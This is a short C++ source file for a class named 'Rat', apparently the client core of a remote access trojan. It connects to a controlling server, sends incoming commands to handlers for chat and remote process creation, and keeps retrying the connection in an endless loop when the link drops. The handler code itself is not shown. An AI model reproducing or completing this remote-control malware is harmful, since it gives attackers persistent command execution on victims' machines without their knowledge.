#include "Rat.h"

#include "ChatHandler.h"
#include "CreateProcessHandler.h"
#include "Trace.h"

Rat::Rat(
	ICommunicationFactory* factory, 
	std::unique_ptr<IConnectionFactory> client
) :
	_client(std::move(client)),
	_connection(_client->Connect()),
	_sender(
		factory->CreateMessageSender(_connection.get())),
	_listener(
		factory->CreateMessageListener(
			_connection.get(),
			[this](const MessageType t, const std::span<char> c) { OnMessage(t, c); },
			[this] { OnDisconnection(); }))
{
	_handlers[MessageType::Chat] = std::make_shared<ChatHandler>();
	_handlers[MessageType::CreateProcessS] = std::make_shared<CreateProcessHandler>();
}

void Rat::OnMessage(MessageType type, std::span<char> content)
{
	_handlers[type]->Handle(content);
}

void Rat::OnDisconnection()
{
	Trace("Server disconnected! Trying to reconnect\n");

	bool connected = false;
	while (!connected)
	{
		try
		{
			_connection = _client->Connect();
			connected = true;
		}
		catch (std::runtime_error&)
		{
			Trace("Failed to connect! Trying to reconnect\n");
		}
	}
		
}
